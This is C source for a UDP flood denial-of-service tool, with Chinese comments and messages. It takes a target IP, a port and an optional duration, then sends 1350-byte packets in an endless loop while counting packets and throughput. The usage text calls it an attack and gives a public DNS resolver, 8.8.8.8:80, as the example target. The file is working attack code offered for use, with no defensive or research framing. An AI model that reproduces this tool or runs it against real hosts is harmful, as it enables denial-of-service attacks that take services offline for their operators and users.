#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define PAYLOAD_SIZE 1350

// 打印帮助信息
void print_usage(char *prog_name) {
    printf("\n");
    printf("用法:\n");
    printf("  %s <IP> <PORT>         - 启动攻击（持续攻击）\n", prog_name);
    printf("  %s <IP> <PORT> <秒数>  - 启动攻击（指定秒数后自动停止）\n", prog_name);
    printf("\n");
    printf("示例:\n");
    printf("  %s 8.8.8.8 80          - 持续攻击 8.8.8.8:80\n", prog_name);
    printf("  %s 8.8.8.8 80 60       - 攻击 8.8.8.8:80 60秒\n\n", prog_name);
}

int main(int argc, char *argv[]) {
    // 参数校验
    if (argc < 3 || argc > 4) {
        printf("\n❌ 错误：参数数量不正确\n");
        print_usage(argv[0]);
        return 1;
    }

    // 验证 IP 地址格式
    struct sockaddr_in sa;
    int ip_valid = inet_pton(AF_INET, argv[1], &(sa.sin_addr));
    if (ip_valid != 1) {
        printf("\n❌ 错误：IP 地址格式不正确 (应为 xxx.xxx.xxx.xxx)\n");
        print_usage(argv[0]);
        return 1;
    }

    // 验证端口号
    int port = atoi(argv[2]);
    if (port <= 0 || port > 65535) {
        printf("\n❌ 错误：端口号无效 (范围: 1-65535)\n");
        print_usage(argv[0]);
        return 1;
    }

    // 获取攻击时长
    int attack_seconds = 0;
    if (argc == 4) {
        attack_seconds = atoi(argv[3]);
        if (attack_seconds < 0) {
            printf("\n❌ 错误：时长不能为负数\n");
            print_usage(argv[0]);
            return 1;
        }
    }

    // 创建 socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) { 
        perror("socket"); 
        return 1; 
    }

    // 设置目标地址
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(argv[1]);

    // 准备攻击数据
    char data[PAYLOAD_SIZE];
    memset(data, 'X', PAYLOAD_SIZE);

    // 显示攻击信息
    printf("\n攻击已启动: %s:%d", argv[1], port);
    if (attack_seconds > 0) {
        printf(" (将持续 %d 秒)\n", attack_seconds);
    } else {
        printf(" (将持续攻击，按 Ctrl+C 停止)\n");
    }

    // 记录开始时间
    time_t start_time = time(NULL);
    unsigned long long packet_count = 0;
    unsigned long long bytes_sent = 0;

    // 攻击循环
    while (1) {
        // 检查是否到达指定时长
        if (attack_seconds > 0) {
            time_t now = time(NULL);
            if (now - start_time >= attack_seconds) {
                break;
            }
        }

        // 发送数据包
        int ret = sendto(sockfd, data, PAYLOAD_SIZE, 0, 
                        (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (ret < 0) {
            perror("sendto");
            break;
        }

        packet_count++;
        bytes_sent += ret;
        
        if (packet_count % 10000 == 0) {
            printf("\r已发送: %llu 个包 (%llu MB)", 
                   packet_count, bytes_sent / (1024 * 1024));
            fflush(stdout);
        }
    }
    
    printf("\n\n攻击结束，统计信息:\n");
    printf("总发送包数: %llu\n", packet_count);
    printf("总发送字节: %llu MB\n", bytes_sent / (1024 * 1024));
    
    if (attack_seconds > 0) {
        printf("攻击时长: %d 秒\n", attack_seconds);
        if (packet_count > 0) {
            printf("平均速率: %.2f Mbps\n", 
                   (bytes_sent * 8.0) / (attack_seconds * 1000000));
        }
    }

    close(sockfd);
    return 0;
}
